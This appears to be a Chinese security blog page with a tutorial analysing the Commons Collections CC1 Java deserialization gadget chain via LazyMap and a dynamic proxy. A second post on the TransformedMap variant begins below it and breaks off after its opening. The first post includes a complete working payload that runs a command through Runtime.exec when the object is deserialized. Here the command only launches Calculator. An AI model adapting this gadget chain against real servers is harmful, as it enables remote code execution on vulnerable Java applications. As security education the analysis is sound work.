<!DOCTYPE HTML>
<html>
<head>
	<meta charset="utf-8">
    
	<title>Mask安全小组&#39;s Blog</title>
    <meta name="author" content="">
    
	<meta name="description" content=""> <!-- TODO: truncate -->
	
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

	<link href="atom.xml" rel="alternate" title="Mask安全小组&#39;s Blog" type="application/atom+xml">
	<link href="/favicon.ico" rel="shortcut icon">
    <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
    <link href="/stylesheets/custom.css" media="screen, projection" rel="stylesheet" type="text/css">
    <link href="/stylesheets/hljs.css" media="screen, projection" rel="stylesheet" type="text/css">

    <link href='/stylesheets/font.css' rel='stylesheet' type='text/css'>
	<script src="//cdn.bootcdn.net/ajax/libs/jquery/1.8.2/jquery.min.js"></script>
    <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![}]-->

    <script type="text/javascript" src="/javascripts/jquery-tapir.js"></script>

    <!-- remove or comment it to disable ajaxification -->   
    <!-- <script src="/javascripts/ajaxify.js"></script> -->

    

    

<meta name="generator" content="Hexo 6.2.0"></head>


<body>
    <div id="wrapper">
    <header id="header" class="inner"><!-- for more effects see _animate.scss -->
<h1 class="animated bounceInDown">
    <div id="headerbg">
        Mask安全小组&#39;s Blog
    </div>
</h1>
<span class="subtitle"></span>
<br>

<ul id="social-links" style="text-align:center; clear:both;">
  
  
  
  
  
  
  
  
</ul>


<!-- use full url including 'index.html' for navigation bar if you are using ajax -->
<ul id="nav">
	<li id="ajax"><a href="/index.html">首页</a></li>
	<li id="ajax"><a href="/archives/index.html">文章</a></li>
	<li id="ajax"><a href="/tags/index.html">标签</a></li>
    <li><a href="/atom.xml">RSS</a></li>
    
    <li>
    <div id="dark">
        <form action="//www.google.com.hk/search" method="get" accept-charset="UTF-8" id="search">
            <input type="hidden" name="sitesearch" value="https://blog.mask-sec.com" />
            <input type="text" name="q" results="0" placeholder="搜索..." x-webkit-speech />
        </form>
    </div>
    </li>
        
</ul>




</header>

<div id="toload">
<!-- begin toload -->
    <div id="content" class="inner">
        



  <article class="post">
	<h2 class="title">
		<a href="2022/11/04/Java安全-CC1链LazyMap分析/">Java安全-CC1链LazyMap分析</a>
	</h2>
    <div class="entry-content">
    <div class="meta">
      <div class="date">发布时间: <time datetime="2022-11-03T16:24:48.000Z" itemprop="datePublished">2022-24-4</time>
</div>
      <div class="tags">标签: 

<a href="/tags/Java安全/">Java安全</a>
</div>
    </div>
      
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本篇文章是建立在<a target="_blank" rel="noopener" href="http://mp.weixin.qq.com/s?__biz=MzkyNDM4MzQ3MA==&mid=2247483753&idx=1&sn=07db823828c7cca2996d690b75f1e686&chksm=c1d7e0e8f6a069febc5635e25674d68cd647a16a108f6b011b5b85778bbe73b16c0cda77f034&scene=21#wechat_redirect">《Java安全-CC1链TransformedMap分析》</a>分析上，讲解LazyMap的利用分析。</p>
<p>严格来说ysoserial-CC1利用链用到的是LazyMap而不是TransformedMap，在源码上可以看到。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BELazyMap%E5%88%86%E6%9E%90/640.png" alt="Image"></p>
<h1 id="JdkProxy"><a href="#JdkProxy" class="headerlink" title="JdkProxy"></a>JdkProxy</h1><p>在正式进入LazyMap的分析前，需要先介绍一下JdkProxy，后续会用到，JdkProxy指的是java.lang.reflect.Proxy这个类。</p>
<p>Java里的代理主要是用来实现像AOP的功能，有点像Hook的效果。<strong>这里大家打开IDEA跟着操作，操作下来就能明白JdkProxy的用处了。</strong></p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BELazyMap%E5%88%86%E6%9E%90/640-20221104002614548.png" alt="Image"></p>
<p>这里我们先使用JdkProxy的Api来创建一个proxyMap(其实这个Map就是代理实例)，newProxyInstance的第三个参数需要一个InvocationHandler的实现(这里我们就先正常实现一个就可以了)。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 通过JdkProxy的Api来获取Map</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(</span><br><span class="line">      Map.class.getClassLoader(),</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,</span><br><span class="line">      <span class="comment">// 这里我相当于是对HashMap进行一个代理</span></span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">DemoInvocationHandler</span>(<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;())</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>之后我们定义一个InvocationHandler的实现类(DemoInvocationHandler)。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Object target;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">DemoInvocationHandler</span><span class="params">(Object target)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.target = target;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="comment">// 当调用proxyMap的任意函数时将触发这个invoke函数</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="comment">// 调用代理实例函数前打印</span></span><br><span class="line">        System.out.println(method.getName() + <span class="string">&quot; Invoke Before Print&quot;</span>);</span><br><span class="line">        <span class="comment">// 调用代理实例执行的函数</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> method.invoke(target, args);</span><br><span class="line">        <span class="comment">// 调用代理实例函数后打印</span></span><br><span class="line">        System.out.println(method.getName() + <span class="string">&quot; Invoke After Print&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后我们调用以下proxyMap的put函数</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxyMap.put(<span class="string">&quot;k1&quot;</span>, <span class="string">&quot;v1&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BELazyMap%E5%88%86%E6%9E%90/640-20221104002650993.png" alt="Image"></p>
<p>控制台将会打印两句话，也就是在我们调用proxyMap的put函数后会先进入到DemoInvocationHandler的invoke函数进行处理，然后再由invoke函数内部的代码来决定是否调用HashMap的put函数(因为我们的proxyMap代理的是HashMap)。</p>
<p><strong>所以这里得出这个JdkProxy就能用来实现一些类似Hook、AOP切面编程的功能，就是在函数执行的前后自定义一些动作，甚至是可以决定是否要执行目标函数。</strong></p>
<h1 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h1><p>LazyMap和TransformedMap的区别，LazyMap只有在调用get函数时才会触发Transformer的transform方法，所以像TransformedMap的put、setValue这些就没法用来触发Transformer了。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BELazyMap%E5%88%86%E6%9E%90/640-20221104002708100.png" alt="Image"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map, input -&gt; &#123;</span><br><span class="line">  System.out.println(<span class="string">&quot;LazyMap -- &quot;</span> + input);</span><br><span class="line">  <span class="keyword">return</span> input;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 会打印 LazyMap -- 1231</span></span><br><span class="line">lazyMap.get(<span class="string">&quot;1231&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>跟进LazyMap的get函数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">  <span class="comment">// 这里就相当于懒加载，如果map的key不存在则进入if。</span></span><br><span class="line">  <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="comment">// 不存在的情况下就调用传进来的Transformer的transform方法，将返回值存入map中。</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">    map.put(key, value);</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以这里前边的Transformer的利用写法还是一样的，只是原先用来触发链的是put或者setValue的函数，现在需要想办法换到get。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">   <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">   <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">     <span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">     <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">     <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">   ),</span><br><span class="line">   <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">     <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">     <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">     <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">   ),</span><br><span class="line">   <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">     <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">     <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">     <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;</span><br><span class="line">   )</span><br><span class="line"> &#125;;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map, chainedTransformer);</span><br><span class="line">lazyMap.get(<span class="string">&quot;1231&quot;</span>);</span><br></pre></td></tr></table></figure>

<h1 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h1><p>这个类我们在TransformedMap利用时讲过，但是很遗憾现在它在LazyMap的情况下没法直接使用。我们再来重新看一下它的readObject函数，发现在readObject函数中没有调用get的代码，那么意味着我们替换成LazyMap也没法直接触发。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BELazyMap%E5%88%86%E6%9E%90/640-20221104002756073.png" alt="Image"></p>
<p>我们在这个类里搜一下get，会发现在invoke函数里有调用get的情况。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BELazyMap%E5%88%86%E6%9E%90/640-20221104002803223.png" alt="Image"></p>
<p>这里就存在一个问题，<strong>反序列化在触发时都是通过调用readObject</strong>，而这里的get函数在invoke函数里，那么我们要怎么样触发这个invoke呢？</p>
<p>这里就涉及到Java的JdkProxy，细心的可以发现AnnotationInvocationHandler是一个实现InvocationHandler接口的实现类，那么很明显这个类的存在的作用就是用于代理的。</p>
<p><strong>那么当你的JdkProxy代理实例，调用了任意一个函数时，它都会先进到InvocationHandler的invoke函数中进行处理。</strong></p>
<p>所以根据这个特性我们就可以对Map进行一个代理，然后代理的处理动作(InvocationHandler)就写为AnnotationInvocationHandler，这样LazyMap进行任意一个函数调用时就能进到AnnotationInvocationHandler的invoke函数中，从而触发LazyMap的get函数。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">    <span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">  ),</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">    <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">  ),</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">    <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;</span><br><span class="line">  )</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, lazyMap);</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, handler);</span><br></pre></td></tr></table></figure>

<p>但是有了proxyMap还不能直接生成攻击的payload，因为直接把proxyMap序列化后发送过去，目标反序列化时调用的是proxyMap的readObject。</p>
<p>从之前的TransformedMap分析我们知道AnnotationInvocationHandler中的readObject有操作memberValues，这个memberValues其实就是我们传递进来的proxyMap，那么根据代理的特性，我们只需要调用任意一个proxyMap的函数就能进到InvocationHandler的invoke函数里。</p>
<p>而AnnotationInvocationHandler中的readObject就有调用memberValues的entrySet函数。</p>
<p>我们还需要再包装一层，需要将proxyMap塞入AnnotationInvocationHandler这个类中。</p>
<p>完整Payload如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(&quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestHelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, lazyMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, handler);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> construct.newInstance(Retention.class, proxyMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BELazyMap%E5%88%86%E6%9E%90/640-20221104002841584.png" alt="Image"></p>
<h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><p>LazyMap和TransformedMap一样，并没有解决高版本的问题，对于8u71后的Java版本还是无法使用。</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p>本文的代码和分析过程均参考p牛的《Java安全名漫谈》实现: <a target="_blank" rel="noopener" href="https://github.com/phith0n/JavaThings%EF%BC%8C%E9%9D%9E%E5%B8%B8%E6%84%9F%E8%B0%A2%EF%BC%81">https://github.com/phith0n/JavaThings，非常感谢！</a></p>

      
	</div>

<div class="meta">
	
</div>
</article>

  <article class="post">
	<h2 class="title">
		<a href="2022/10/21/Java安全-CC1链TransformedMap分析/">Java安全-CC1链TransformedMap分析</a>
	</h2>
    <div class="entry-content">
    <div class="meta">
      <div class="date">发布时间: <time datetime="2022-10-21T03:21:05.000Z" itemprop="datePublished">2022-21-21</time>
</div>
      <div class="tags">标签: 

<a href="/tags/Java安全/">Java安全</a>
</div>
    </div>
      
        <p>本文将详细分析讲解CommonCollections组件的反序列化漏洞结合使用TransformedMap进行触发RCE。</p>
<p>在开始前，你需要具备掌握JavaSE的基础、Java反射的知识点，以及需要Jdk版本环境小于8u71。</p>
<p>旧版Jdk下载地址: <a target="_blank" rel="noopener" href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</a></p>
<h1 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h1><p>先在IDEA上创建一个Maven项目，并引入存在漏洞的commons-collections组件，创建好相应的main函数。方便后续分析</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="一些类和接口介绍"><a href="#一些类和接口介绍" class="headerlink" title="一些类和接口介绍"></a>一些类和接口介绍</h1><p>在正式开始分析CC1-TransformedMap Payload之前，需要先讲解一下几个类和接口的作用。</p>
<h2 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h2><p>先介绍一下TransformedMap这个类，个人理解这个类主要是对Map的一个包装，包装后的Map能实现在调用put函数时，对key和value进一步的进行处理(或者也可以叫转换)，原生的Map是没有这个功能的，所以通过包装之后就能实现这个效果。</p>
